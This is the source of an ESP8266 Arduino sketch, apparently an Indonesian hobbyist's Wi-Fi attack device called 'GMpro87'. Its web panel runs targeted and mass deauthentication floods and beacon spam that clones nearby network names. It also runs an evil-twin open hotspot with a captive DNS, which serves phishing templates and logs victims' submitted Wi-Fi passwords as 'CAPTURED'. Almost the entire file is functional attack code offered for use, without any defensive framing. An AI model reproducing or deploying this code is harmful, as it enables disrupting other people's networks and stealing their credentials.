#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

#define LED_PIN 2 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  int clients;
  bool selected; // Tambahan untuk multi-select
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
String _eventLogs = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
bool hidden_ssid = false; // Status Hidden SSID Admin
bool pass_captured = false;
String config_ssid = "GMpro2"; // Sesuai catatan SSID kamu
String config_pass = "Sangkur87";
int selectedET = 1;
int beacon_count = 10;

void addLog(String msg) {
  String entry = "[" + String(millis()/1000) + "s] " + msg;
  _eventLogs = entry + "\n" + _eventLogs;
  if (_eventLogs.length() > 1500) _eventLogs = _eventLogs.substring(0, 1500);
  File f = LittleFS.open("/log.txt", "a");
  if (f) { f.println(entry); f.close(); }
}

void performScan() {
  int n = WiFi.scanNetworks(false, true); 
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      String s = WiFi.SSID(i);
      _networks[i].ssid = (s.length() == 0) ? "*HIDDEN*" : s;
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      _networks[i].clients = os_random() % 5;
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// Fungsi Deauth dengan Log Pkt
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  if(wifi_send_pkt_freedom(pkt, 26, 0) == 0) {
    // Optional: addLog("Pkt Deauth Sent to " + bytesToStr(bssid, 6));
  }
}

void handleIndex() {
  if (webServer.hasArg("password")) {
    addLog("!!! CAPTURED: " + webServer.arg("password"));
    pass_captured = true;
    webServer.send(200, "text/html", "Verifying... please wait.");
    return;
  }

  // Handle Logic Buttons
  if (webServer.hasArg("clear_logs")) { _eventLogs = ""; LittleFS.remove("/log.txt"); addLog("Logs wiped."); pass_captured = false; }
  
  if (webServer.hasArg("ap")) {
    String target = webServer.arg("ap");
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == target) {
        _networks[i].selected = !_networks[i].selected;
        addLog(_networks[i].selected ? "Selected: " + _networks[i].ssid : "Deselected: " + _networks[i].ssid);
      }
    }
  }

  if (webServer.hasArg("deselect_all")) {
    for(int i=0; i<16; i++) _networks[i].selected = false;
    addLog("All targets cleared.");
  }
  
  if (webServer.hasArg("hidden")) {
    hidden_ssid = (webServer.arg("hidden") == "1");
    addLog("Admin SSID Hidden: " + String(hidden_ssid ? "ON" : "OFF"));
  }

  if (webServer.hasArg("deauth")) {
    deauthing_active = (webServer.arg("deauth") == "1");
    if(deauthing_active) addLog("ATTACK: Deauth Started");
  }

  if (webServer.hasArg("mass")) {
    mass_deauth = (webServer.arg("mass") == "1");
    if(mass_deauth) addLog("ATTACK: Mass Deauth Active");
  }

  if (webServer.hasArg("spam")) {
    beacon_spam = (webServer.arg("spam") == "1");
    if (webServer.hasArg("count")) beacon_count = webServer.arg("count").toInt();
    if(beacon_spam) addLog("ATTACK: Beacon Spam Active");
  }

  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "1");
    WiFi.softAPdisconnect(true);
    if (hotspot_active) {
      // Cari SSID pertama yang diselect untuk jadi target ET
      String targetSSID = "FreeWiFi";
      int targetCh = 1;
      for(int i=0; i<16; i++) { if(_networks[i].selected) { targetSSID = _networks[i].ssid; targetCh = _networks[i].ch; break; } }
      WiFi.softAP(targetSSID.c_str(), "", targetCh, false);
      addLog("ET Mode Live: " + targetSSID);
    } else {
      WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
    }
  }

  // Generate HTML
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
  html += "body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; }";
  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; }";
  html += ".header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }";
  html += ".header-box h2 { margin: 0; text-transform: uppercase; letter-spacing: 2px; }";
  html += ".tabs { display: flex; gap: 5px; margin-bottom: 15px; }";
  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }";
  html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
  html += ".tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; }";
  html += ".show { display: block; }";
  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; table-layout: fixed; }";
  html += "th, td { border: 1px solid #00ff00; padding: 6px 4px; text-align: center; overflow: hidden; } th { background: #1a1a1a; }";
  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; cursor: pointer; text-decoration: none; font-size: 10px; width: 100%; box-sizing: border-box; }";
  html += ".btn-red { border-color: #ff0000; color: #ff0000; }";
  html += "input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; box-sizing: border-box; width: 100%; font-family: 'Courier New'; }";
  html += "textarea { width: 100%; box-sizing: border-box; resize: none; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; font-size: 10px; }";
  html += "hr { border: 0; border-top: 1px solid #333; margin: 15px 0; }</style></head><body>";
  
  html += "<div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>";
  html += "<div class='tabs'><button id='btn-m' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
  
  // TAB MAIN
  html += "<div id='m' class='tab-content show'><div style='display:flex; gap:5px; margin-bottom:10px;'>";
  html += "<a href='/?deauth=" + String(!deauthing_active) + "' style='flex:1'><button class='btn'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</button></a>";
  html += "<a href='/?hotspot=" + String(!hotspot_active) + "' style='flex:1'><button class='btn'>" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</button></a></div>";
  html += "<a href='/?deselect_all=1'><button class='btn' style='margin-bottom:5px;'>DESELECT ALL</button></a>";
  html += "<table><thead><tr><th style='width:35%'>SSID</th><th>CH</th><th>USR</th><th>SNR%</th><th style='width:25%'>SELECT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(_networks[i].ssid == "") continue;
    int s_pct = 2 * (_networks[i].rssi + 100); if(s_pct>100) s_pct=100;
    html += "<tr><td style='text-align:left;'>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].clients) + "</td><td>" + String(s_pct) + "%</td>";
    html += "<td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button class='btn' " + (_networks[i].selected ?"style='background:#0f0;color:#000;'":"") + ">" + (_networks[i].selected ? "LOCKED" : "SELECT") + "</button></a></td></tr>";
  }
  html += "</tbody></table></div>";

  // TAB ATTACK
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3><a href='/?mass=" + String(!mass_deauth) + "'><button class='btn " + (mass_deauth?"btn-red":"") + "' style='padding:15px; font-weight:bold;'>" + (mass_deauth?"STOP MASS DEAUTH":"START MASS DEAUTH") + "</button></a><hr>";
  html += "<form action='/' method='GET'><button type='submit' name='spam' value='" + String(!beacon_spam) + "' class='btn " + (beacon_spam?"btn-red":"") + "' style='padding:10px; font-weight:bold;'>" + (beacon_spam?"STOP BEACON SPAM":"START BEACON SPAM") + "</button>";
  html += "<div style='margin-top:10px;'><label>Clone Count:</label><input type='number' name='count' value='" + String(beacon_count) + "'></div></form></div>";

  // TAB SETTING
  html += "<div id='s' class='tab-content'><h3>File Manager</h3><div class='input-group' style='display:flex; gap:5px; align-items: flex-end;'><div style='flex-grow:1'><label>Template HTML:</label><select id='tmpSel'>";
  for(int i=1; i<=4; i++) html += String("<option ") + (selectedET==i?"selected":"") + ">etwin" + String(i) + ".html</option>";
  html += "</select></div><button class='btn' style='width:80px; height:32px;' onclick='window.open(\"/\"+document.getElementById(\"tmpSel\").value)'>PREVIEW</button></div>";
  html += "<form action='/upload' method='POST' enctype='multipart/form-data'><label>Upload Template:</label><div style='display:flex; gap:5px;'><input type='file' name='upload'><button type='submit' class='btn' style='width:80px;'>UPLOAD</button></div></form><hr>";
  html += "<h3>Device Configuration</h3><div class='input-group'><label>Hidden SSID Admin:</label><a href='/?hidden=" + String(!hidden_ssid) + "'><button class='btn'>" + (hidden_ssid?"HIDDEN: ON":"HIDDEN: OFF") + "</button></a></div>";
  html += "<div class='input-group'><label>SSID Admin:</label><input type='text' value='" + config_ssid + "'></div><br><button class='btn' style='padding:12px; background:#0f0; color:#000; font-weight:bold;'>SAVE & RESTART</button></div>";

  html += "<hr><h4>Live Logs</h4><textarea id='logBox' rows='8' readonly>" + _eventLogs + "</textarea>";
  html += "<button class='btn' style='margin-top:5px; padding:8px;' onclick='location=\"/?clear_logs=1\"'>CLEAR LOGS</button></div>";
  
  // JavaScript Fix untuk Tab Persistence
  html += "<script>function openTab(t){localStorage.setItem('activeTab',t);document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}";
  html += "window.onload=function(){var t=localStorage.getItem('activeTab')||'m';openTab(t);};</script></body></html>";
  
  webServer.send(200, "text/html", html);
}

void setup() {
  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH);
  Serial.begin(115200); 
  if(!LittleFS.begin()) { Serial.println("FS Error"); }
  
  WiFi.mode(WIFI_AP_STA); 
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", HTTP_GET, handleIndex);
  
  // File Preview Handler
  webServer.onNotFound([]() {
    String path = webServer.uri();
    if (LittleFS.exists(path)) {
      File f = LittleFS.open(path, "r");
      webServer.streamFile(f, "text/html");
      f.close();
    } else {
      handleIndex();
    }
  });

  webServer.on("/upload", HTTP_POST, [](){ 
    webServer.sendHeader("Location", "/");
    webServer.send(303); 
  }, [](){
    HTTPUpload& upload = webServer.upload();
    if (upload.status == UPLOAD_FILE_START) {
      String filename = upload.filename;
      if (!filename.startsWith("/")) filename = "/" + filename;
      File f = LittleFS.open(filename, "w"); f.close();
    } else if (upload.status == UPLOAD_FILE_WRITE) {
      File f = LittleFS.open("/" + upload.filename, "a");
      f.write(upload.buf, upload.currentSize); f.close();
    }
  });

  webServer.begin();
  addLog("GMpro87 System Started.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // LED Animation
  static unsigned long last_led = 0;
  int interval = pass_captured ? 100 : (hotspot_active ? 1000 : 400);
  if ((deauthing_active || mass_deauth || beacon_spam || hotspot_active) && (millis() - last_led > interval)) {
    digitalWrite(LED_PIN, !digitalRead(LED_PIN)); 
    last_led = millis();
  } else if (!deauthing_active && !mass_deauth && !beacon_spam && !hotspot_active) {
    digitalWrite(LED_PIN, HIGH);
  }

  // Attack Loop
  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 200) {
    // 1. Deauth Target
    if (deauthing_active) {
      for(int i=0; i<16; i++) {
        if(_networks[i].selected) sendDeauth(_networks[i].bssid, _networks[i].ch);
      }
    }
    // 2. Mass Deauth (Semua kecuali admin)
    if (mass_deauth) {
      for(int i=0; i<16; i++) {
        if(_networks[i].ssid != "" && _networks[i].ssid != config_ssid) sendDeauth(_networks[i].bssid, _networks[i].ch);
      }
    }
    // 3. Beacon Spam (Clone SSIDs)
    if (beacon_spam) {
      for(int i=0; i < 16 && i < beacon_count; i++) {
        if(_networks[i].ssid == "" || _networks[i].ssid == "*HIDDEN*") continue;
        uint8_t bcn[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x04, 0x0b, 0x16, 0x24, 0x30, 0x03, 0x01 };
        bcn[37] = _networks[i].ch;
        bcn[38] = 0x00; // Element ID for SSID
        bcn[39] = _networks[i].ssid.length();
        memcpy(&bcn[40], _networks[i].ssid.c_str(), bcn[39]);
        wifi_send_pkt_freedom(bcn, 40 + bcn[39], 0);
      }
    }
    last_atk = millis();
  }

  static unsigned long last_scan = 0;
  if (millis() - last_scan >= 15000 && !deauthing_active && !hotspot_active) { 
    performScan(); 
    last_scan = millis(); 
  }
}
